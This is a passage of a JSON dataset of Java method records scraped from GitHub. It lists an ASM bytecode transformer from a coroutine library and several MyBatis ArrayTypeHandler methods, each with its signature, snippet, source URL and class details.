["public"], "return_type": "byte", "snippet": "    public byte[] transform(ClassReader cr) {        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);        // make sure that the transformed bytecode is sane        ClassVisitor visitor = new CheckClassAdapter(cw, false);        // trace the classes        if (Configs.isDebugEnabled()) {            visitor = new TraceClassVisitor(visitor, new PrintWriter(System.out));        }        // enhance bytecode        visitor = new JroutineClassAdapter(visitor);        cr.accept(visitor, 0);        return cw.toByteArray();    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/AsmClassTransformer.java", "stars": "3", "class": {"name": "AsmClassTransformer", "extends": null, "implements": ["ClassTransformer"], "modifiers": ["public"]}}, {"method_name": "setNonNullParameter", "params": ["PreparedStatement", "int", "Object", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, Object parameter, JdbcType jdbcType)      throws SQLException {    if (parameter instanceof Array) {      // it's the user's responsibility to properly free() the Array instance      ps.setArray(i, (Array) parameter);    } else {      if (!parameter.getClass().isArray()) {        throw new TypeException(            \"ArrayType Handler requires SQL array or java array parameter and does not support type \"                + parameter.getClass());      }      Class<?> componentType = parameter.getClass().getComponentType();      String arrayTypeName = resolveTypeName(componentType);      Array array = ps.getConnection().createArrayOf(arrayTypeName, (Object[]) parameter);      ps.setArray(i, array);      array.free();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ArrayTypeHandler.java", "stars": "15", "class": {"name": "ArrayTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "resolveTypeName", "params": ["Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String resolveTypeName(Class<?> type) {    return STANDARD_MAPPING.getOrDefault(type, JdbcType.JAVA_OBJECT.name());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ArrayTypeHandler.java", "stars": "15", "class": {"name": "ArrayTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getNullableResult(ResultSet rs, String columnName) throws SQLException {    return extractArray(rs.getArray(columnName));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ArrayTypeHandler.java", "stars": "15", "class": {"name": "ArrayTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getNullableResult(ResultSet rs, int columnIndex) throws SQLException {    return extractArray(rs.getArray(columnIndex));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ArrayTypeHandler.java", "stars": "15", "class": {"name": "ArrayTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {    return extractArray(cs.getArray(columnIndex));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ArrayTypeHandler.java", "stars": "15", "class": {"name": "ArrayTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}]